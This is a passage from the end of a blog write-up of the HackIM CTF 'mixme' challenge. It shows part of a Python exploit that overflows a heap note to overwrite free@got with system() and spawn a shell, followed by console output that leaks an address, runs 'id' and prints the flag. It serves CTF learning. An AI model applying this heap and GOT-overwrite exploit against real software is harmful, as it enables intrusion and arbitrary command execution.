</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x29\x00\x00\x00\x71\x00\x00\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mi">12</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mh">0x804b020</span><span class="p">))</span>
</span><span class='line'><span class="c">#     ^ overflow              ^ restore &#39;q&#39;           ^ size of q  ^ free@got</span>
</span><span class='line'>
</span><span class='line'><span class="k">print</span> <span class="s">&quot;[+] replacing free() with system()&quot;</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;edit&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;q&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">p</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>     <span class="c"># free@got overwritten with system</span>
</span><span class='line'>
</span><span class='line'><span class="c"># trigger system(&#39;/bin/sh&#39;)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;get&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;sh&#39;</span><span class="p">)</span>  <span class="c"># this note contains &#39;/bin/sh&#39; and those contents are passed to system()</span>
</span><span class='line'><span class="n">z</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s">&#39;7&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># shell spawned, interact with it!</span>
</span><span class='line'><span class="n">t</span><span class="o">=</span><span class="n">telnetlib</span><span class="o">.</span><span class="n">Telnet</span><span class="p">()</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">sock</span><span class="o">=</span><span class="n">s</span>
</span><span class='line'><span class="n">t</span><span class="o">.</span><span class="n">interact</span><span class="p">()</span>
</span><span class='line'>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>I ran it, and to my surprise, I got it right the first time! I dropped into a shell on the remote box:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@ubuntu-VirtualBox:/home/ubuntu/nullcon/mixme# python exploit.py
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> overflowing a to <span class="nb">set </span>b to free@got
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> replacing free<span class="o">()</span> with <span class="nb">printf</span><span class="o">()</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> triggering format string
</span><span class='line'>Name: Size: --%3<span class="nv">$x</span>--b768d024cSelect op <span class="o">(</span>store/get/edit/exit<span class="o">)</span>:
</span><span class='line'><span class="o">[</span><span class="s1">&#39;b768d024&#39;</span><span class="o">]</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> found first addr: 0xb768d024L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> system @ 0xb7667100L
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> overflowing t to <span class="nb">set </span>q to free@got
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> replacing free<span class="o">()</span> with system<span class="o">()</span>
</span><span class='line'>/bin/sh
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span><span class="m">1005</span> <span class="nv">gid</span><span class="o">=</span><span class="m">1005</span> <span class="nv">groups</span><span class="o">=</span>0
</span><span class='line'>cat flag.txt
</span><span class='line'>aw3s0m3++_hipp1e_pwn_r0ckst4r
</span></code></pre></td></tr></table></div></figure>


<p>The flag was <code>aw3s0m3++_hipp1e_pwn_r0ckst4r</code>. This one was really though and I&rsquo;m glad I managed to beat it with just 20 minutes left for the ctf!</p>
</div>


  <footer>
    <p class="meta">
      
  

<span class="byline author vcard">Posted by <span class="fn">barrebas</span></span>

      




<time class='entry-date' datetime='2015-01-11T18:52:35+01:00'><span class='date'><span class='date-month'>Jan</span> <span class='date-day'>11</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>6:52 pm</span></time>
      

<span class="categories">
  
    <a class='category' href='/blog/categories/binary/'>binary</a>, <a class='category' href='/blog/categories/ctf/'>ctf</a>, <a class='category' href='/blog/categories/exploitation/'>exploitation</a>, <a class='category' href='/blog/categories/hackim/'>hackim</a>, <a class='category' href='/blog/categories/heap/'>heap</a>, <a class='category' href='/blog/categories/nullcon/'>nullcon</a>
  
</span>


    </p>
    
      <div class="sharing">
  
  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/" data-via="barrebas" data-counturl="http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/" >Tweet</a>
  
  
  
</div>

    
    <p class="meta">
      
        <a class="basic-alignment left" href="/blog/2015/01/03/weekly-roundup-2015-number-1/" title="Previous Post: Weekly Roundup 2015 #1">&laquo; Weekly Roundup 2015 #1</a>
      
      
        <a class="basic-alignment right" href="/blog/2015/01/11/hackim-ctf-mentalnote/" title="Next Post: HackIM CTF - MentalNote">HackIM CTF - MentalNote &raquo;</a>
      
    </p>
  </footer>
</article>

  <section>
    <h1>Comments</h1>
    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>
  </section>

</div>

<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2015/06/28/rop-primer-level0/">ROP Primer - Level0</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/05/29/legitbs-ctf-r0pbaby/">LegitBS CTF - R0pbaby</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/04/02/backdoor-ctf-judge/">Backdoor CTF - Judge</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/04/02/backdoor-ctf-lhc/">Backdoor CTF - LHC</a>
      </li>
    
      <li class="post">
        <a href="/blog/2015/04/02/backdoor-ctf-qr/">Backdoor CTF - QR</a>
      </li>
    
  </ul>
</section>





  
</aside>


    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2015 - barrebas -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  

<script type="text/javascript">
      var disqus_shortname = 'barrebas';
      
        
        // var disqus_developer = 1;
        var disqus_identifier = 'http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/';
        var disqus_url = 'http://barrebas.github.io/blog/2015/01/11/hackim-ctf-mixme-writeup/';
        var disqus_script = 'embed.js';
      
    (function () {
      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
